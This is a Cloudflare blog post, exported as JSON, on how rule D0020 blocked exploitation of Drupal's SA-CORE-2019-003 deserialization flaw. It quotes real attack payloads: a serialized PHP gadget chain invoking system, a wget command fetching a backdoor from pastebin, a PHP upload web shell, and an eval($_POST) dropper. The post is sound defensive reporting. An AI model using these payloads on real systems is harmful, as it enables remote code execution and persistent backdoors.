{
	"locale": "en-us",
	"post": {
		"access": true,
		"authors": [
			{
				"id": "5d1644b141acde0011a94fed",
				"name": "Richard Sommerville",
				"slug": "richard-sommerville",
				"profile_image": "http://blog.cloudflare.com/content/images/2018/09/2018-03-19-122955.jpg",
				"cover_image": "http://blog.cloudflare.com/content/images/2018/09/Screenshot-2018-09-05-17.51.47.png",
				"bio": null,
				"website": null,
				"location": null,
				"facebook": null,
				"twitter": null,
				"meta_title": null,
				"meta_description": null,
				"url": "http://blog.cloudflare.com/author/richard-sommerville/"
			}
		],
		"canonical_url": null,
		"codeinjection_foot": null,
		"codeinjection_head": null,
		"comment_id": "5c79a0f9518a2300c0287c77",
		"comments": false,
		"created_at": "2019-03-01T21:15:37.000+00:00",
		"custom_excerpt": "Drupal discovered a severe vulnerability and said they would release a patch. When the patch was released we analysed and created rules to mitigate these. By analysing the patch we created WAF rules to protect Cloudflare customers running Drupal.",
		"custom_template": null,
		"email_subject": null,
		"excerpt": "Drupal discovered a severe vulnerability and said they would release a patch. When the patch was released we analysed and created rules to mitigate these. By analysing the patch we created WAF rules to protect Cloudflare customers running Drupal.",
		"feature_image": "http://blog.cloudflare.com/content/images/2019/03/D0020-1.png",
		"feature_image_alt": null,
		"feature_image_caption": null,
		"featured": false,
		"frontmatter": null,
		"html": "<p>On the 20th February 2019, Drupal <a href=\"https://www.drupal.org/psa-2019-02-19\">announced</a> that they had discovered a severe vulnerability and that they would be releasing a patch for it the next day. Drupal is a Content Management System used by many of our customers, which made it important that our WAF protect against the vulnerability as quickly as possible.</p><p>As soon as Drupal released their patch, we analysed it to establish what kind of payloads could be used against it and created rules to mitigate these. By analysing the patch we were able to put together WAF rules to protect cloudflare customers running Drupal.</p><p>We identified the type of vulnerability we were dealing within 15 minutes. From here, we were able to deploy rules to block the exploit well before any real attacks were seen.</p><h3 id=\"the-exploit\">The exploit</h3><p>As Drupal's <a href=\"https://www.drupal.org/sa-core-2019-003\">release announcement</a> explains, a site is affected if:</p><ul><li>It has the Drupal 8 RESTful API enabled                                      </li><li>Or it uses <a href=\"https://www.drupal.org/sa-contrib-2019-020\">one</a> of the <a href=\"https://www.drupal.org/security/contrib\">8 modules</a> found to be affected</li></ul><p>From looking at the <a href=\"https://github.com/drupal/drupal/commit/9b3e441c2c6d98da402fcc8cab1e921ab8286936\">patch</a> we very quickly realised the exploit would be based on deserialization. The option <code>['allowed_classes' =&gt; FALSE]</code> was added as part of the patch to the <a href=\"https://github.com/drupal/drupal/commit/9b3e441c2c6d98da402fcc8cab1e921ab8286936#diff-9077dc961778b7c8d9c47882c4248e42L67\">link</a> and <a href=\"https://github.com/drupal/drupal/commit/9b3e441c2c6d98da402fcc8cab1e921ab8286936#diff-d200adc66611cf78e65f2a3258144c49L194\">map</a> field types. This indicates that while these items are supposed to receive some serialized PHP, there was no legitimate case for supplying a serialized PHP object.</p><p>This is important because the easiest way to exploit a deserialization vulnerability in PHP is to supply a serialized Object that is crafted to execute code when deserialized.</p><p>Making the situation worse was the fact that the deserialization was performed regardless of any authentication.</p><p>We also realised that this meant blindly blocking all serialized PHP would break their intended functionality, as clearly these fields are supposed to receive specific kinds of serialized PHP, for example arrays or strings. Although as the PHP documentation <a href=\"https://secure.php.net/manual/en/function.unserialize.php\">notes</a>, it’s always a risky thing to deserialize untrusted data, even when restricting the set of data that’s excepted.</p><p>This blog <a href=\"https://www.ambionics.io/blog/drupal8-rce\">post from Ambionics</a> does a good job at explaining what a concrete exploitation of the vulnerability looks like, when applied to the Drupal 8 RESTful API.</p><h3 id=\"what-we-caught\">What we caught</h3><p>After the vulnerability was announced, we created several rules to experiment with different ways to build a signature to catch exploit attempts. Within an hour of the Drupal announcement we had deployed these in simulate mode, which logs potentially malicious requests without blocking them. After monitoring for false positives they were then improved them a few times as we tuned them.</p><p>This culminated in the deploy of rule D0020, which has blocked a number of attackers as shown in the graph below. The rule was already deployed in ‘drop’ mode by the time our first attack was observed at around 7pm UTC on Friday the 22nd of February 2019, and to date it has matched zero false positives. This is less than 48 hours from the announcement from Drupal.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"http://blog.cloudflare.com/content/images/2019/03/D0020.png\" class=\"kg-image\" alt loading=\"lazy\"><figcaption>Figure 1: Hits on rule D0020, with the first attack seen on the 22th February 2019.</figcaption></figure><p></p><p>These first attacks leveraged the “guzzle/rce1” gadget from phpggc to invoke the linux command “id” via PHP’s “system” function, exactly as <a href=\"https://www.ambionics.io/blog/drupal8-rce\">ambionics</a> did.</p><p></p><!--kg-card-begin: markdown--><pre><code>'O:24:&quot;GuzzleHttp\\Psr7\\FnStream&quot;:2:{s:33:&quot;GuzzleHttp\\Psr7\\FnStreammethods&quot;;a:1:{s:5:&quot;close&quot;;a:2:{i:0;O:23:&quot;GuzzleHttp\\HandlerStack&quot;:3:{s:32:&quot;GuzzleHttp\\HandlerStackhandler&quot;;s:2:&quot;id&quot;;s:30:&quot;GuzzleHttp\\HandlerStackstack&quot;;a:1:{i:0;a:1:{i:0;s:6:&quot;system&quot;;}}s:31:&quot;GuzzleHttp\\HandlerStackcached&quot;;b:0;}i:1;s:7:&quot;resolve&quot;;}}s:9:&quot;_fn_close&quot;;a:2:{i:0;r:4;i:1;s:7:&quot;resolve&quot;;}}''\n</code></pre>\n<!--kg-card-end: markdown--><p></p><p>After this we saw several more attempts to use this gadget for executing various payloads, mostly to test whether targeted servers were vulnerable. Things like ‘phpinfo’, echoing strings and performing calculations.</p><p>The first malicious payload we saw used the same gadget, but this time to save a malicious payload from pastebin onto the user’s server.</p><p><code>wget -O 1x.php https://pastebin.com/raw/npLq4493</code></p><p>This script would have placed a backdoor on the target system by allowing them to upload files to the server via an HTML form. This would have given the attacker continued access to the system even if it was subsequently patched.</p><p></p><!--kg-card-begin: markdown--><pre><code>&lt;?  echo &quot;'XXXXXXXXXXXX&quot;;\n$cwd = getcwd();\nEcho '&lt;center&gt;  &lt;form method=&quot;post&quot; target=&quot;_self&quot; enctype=&quot;multipart/form-data&quot;&gt;  &lt;input type=&quot;file&quot; size=&quot;20&quot; name=&quot;uploads&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;upload&quot; /&gt;  &lt;/form&gt;  &lt;/center&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt;&lt;br&gt;';\nif (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);\n    Echo &quot;&lt;script&gt;alert('upload Done');\n\t\t&lt;/script&gt;&lt;b&gt;Uploaded !!!&lt;/b&gt;&lt;br&gt;name : &quot;.$_FILES['uploads']['name'].&quot;&lt;br&gt;size : &quot;.$_FILES['uploads']['size'].&quot;&lt;br&gt;type : &quot;.$_FILES['uploads']['type'];\n}\n?&gt;\n</code></pre>\n<!--kg-card-end: markdown--><p></p><p>Another malicious payload seen was much more minimal:</p><p><code>echo '&lt;?php @eval($_POST['pass']) ?&gt;' &gt; vuln1.php</code></p><p>This payload creates a small PHP file on the server, which contains the dangerous eval() function. If this hadn’t been blocked, it would have allowed the attacker to issue commands via a single HTTP request to the vuln1.php file that could execute arbitrary commands directly on the potentially vulnerable system.</p><h3 id=\"rates-of-exploitation\">Rates of exploitation</h3><p>The pattern we saw here is fairly typical of a newly announced vulnerability. Once a vulnerability is published, it doesn’t take long to see real attackers making use of the vulnerability - initially in small numbers with “test” payloads to identify whether the attacks work, but shortly afterwards in much higher numbers, and with more dangerous and subtle payloads. This vulnerability was weaponized within two days of disclosure, but that is by no means the shortest time frame we’ve seen.</p><p>It’s very hard to patch systems quickly enough to ensure that attackers don’t get through, so products like Cloudflare’s WAF are a vital line of defense against these emerging vulnerabilities.</p>",
		"id": "5d16453b41acde0011a957d5",
		"meta_description": null,
		"meta_title": null,
		"og_description": null,
		"og_image": null,
		"og_title": null,
		"primary_author": {
			"id": "5d1644b141acde0011a94fed",
			"name": "Richard Sommerville",
			"slug": "richard-sommerville",
			"profile_image": "http://blog.cloudflare.com/content/images/2018/09/2018-03-19-122955.jpg",
			"cover_image": "http://blog.cloudflare.com/content/images/2018/09/Screenshot-2018-09-05-17.51.47.png",
			"bio": null,
			"website": null,
			"location": null,
			"facebook": null,
			"twitter": null,
			"meta_title": null,
			"meta_description": null,
			"url": "http://blog.cloudflare.com/author/richard-sommerville/"
		},
		"primary_tag": {
			"id": "5d16450341acde0011a9519d",
			"name": "Drupal",
			"slug": "drupal",
			"description": null,
			"feature_image": null,
			"visibility": "public",
			"meta_title": null,
			"meta_description": null,
			"og_image": null,
			"og_title": null,
			"og_description": null,
			"twitter_image": null,
			"twitter_title": null,
			"twitter_description": null,
			"codeinjection_head": null,
			"codeinjection_foot": null,
			"canonical_url": null,
			"accent_color": null,
			"url": "http://blog.cloudflare.com/tag/drupal/"
		},
		"published_at": "2019-03-05T22:55:04.000+00:00",
		"reading_time": 4,
		"slug": "stopping-drupal-sa-core-2019-003",
		"tags": [
			{
				"id": "5d16450341acde0011a9519d",
				"name": "Drupal",
				"slug": "drupal",
				"description": null,
				"feature_image": null,
				"visibility": "public",
				"meta_title": null,
				"meta_description": null,
				"og_image": null,
				"og_title": null,
				"og_description": null,
				"twitter_image": null,
				"twitter_title": null,
				"twitter_description": null,
				"codeinjection_head": null,
				"codeinjection_foot": null,
				"canonical_url": null,
				"accent_color": null,
				"url": "http://blog.cloudflare.com/tag/drupal/"
			},
			{
				"id": "5d16450341acde0011a951e6",
				"name": "WAF",
				"slug": "waf",
				"description": null,
				"feature_image": null,
				"visibility": "public",
				"meta_title": null,
				"meta_description": null,
				"og_image": null,
				"og_title": null,
				"og_description": null,
				"twitter_image": null,
				"twitter_title": null,
				"twitter_description": null,
				"codeinjection_head": null,
				"codeinjection_foot": null,
				"canonical_url": null,
				"accent_color": null,
				"url": "http://blog.cloudflare.com/tag/waf/"
			},
			{
				"id": "5d16450341acde0011a951a5",
				"name": "WAF Rules",
				"slug": "waf-rules",
				"description": null,
				"feature_image": null,
				"visibility": "public",
				"meta_title": null,
				"meta_description": "WAF Rules (EN)",
				"og_image": null,
				"og_title": null,
				"og_description": null,
				"twitter_image": null,
				"twitter_title": null,
				"twitter_description": null,
				"codeinjection_head": null,
				"codeinjection_foot": null,
				"canonical_url": null,
				"accent_color": null,
				"url": "http://blog.cloudflare.com/tag/waf-rules/"
			},
			{
				"id": "5d16450341acde0011a95265",
				"name": "Security",
				"slug": "security",
				"description": null,
				"feature_image": "http://blog.cloudflare.com/content/images/2020/10/Security.png",
				"visibility": "public",
				"meta_title": "Cloudflare Blog: Security",
				"meta_description": "Collection of Cloudflare blog posts tagged 'Security'.",
				"og_image": null,
				"og_title": null,
				"og_description": null,
				"twitter_image": null,
				"twitter_title": null,
				"twitter_description": null,
				"codeinjection_head": null,
				"codeinjection_foot": null,
				"canonical_url": null,
				"accent_color": null,
				"url": "http://blog.cloudflare.com/tag/security/"
			},
			{
				"id": "5d16450341acde0011a951aa",
				"name": "Vulnerabilities",
				"slug": "vulnerabilities",
				"description": "Vulnerabilities (EN)",
				"feature_image": null,
				"visibility": "public",
				"meta_title": null,
				"meta_description": null,
				"og_image": null,
				"og_title": null,
				"og_description": null,
				"twitter_image": null,
				"twitter_title": null,
				"twitter_description": null,
				"codeinjection_head": null,
				"codeinjection_foot": null,
				"canonical_url": null,
				"accent_color": null,
				"url": "http://blog.cloudflare.com/tag/vulnerabilities/"
			}
		],
		"title": "Stopping Drupal’s SA-CORE-2019-003 Vulnerability",
		"twitter_description": null,
		"twitter_image": null,
		"twitter_title": null,
		"updated_at": "2021-04-10T17:20:53.000+01:00",
		"url": "http://blog.cloudflare.com/stopping-drupal-sa-core-2019-003/",
		"uuid": "6296f05e-6e5c-4dc3-974e-6feae931d326",
		"visibility": "public"
	}
}